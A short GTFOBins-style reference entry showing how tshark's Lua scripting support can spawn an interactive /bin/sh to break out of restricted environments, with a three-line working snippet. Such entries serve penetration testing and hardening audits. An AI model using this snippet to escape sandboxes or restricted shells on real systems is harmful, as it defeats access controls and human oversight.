# GTFOBin: tshark

This program is able to execute `lua` code.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
TF=$(mktemp)
echo 'os.execute("/bin/sh")' >$TF
tshark -Xlua_script:$TF
```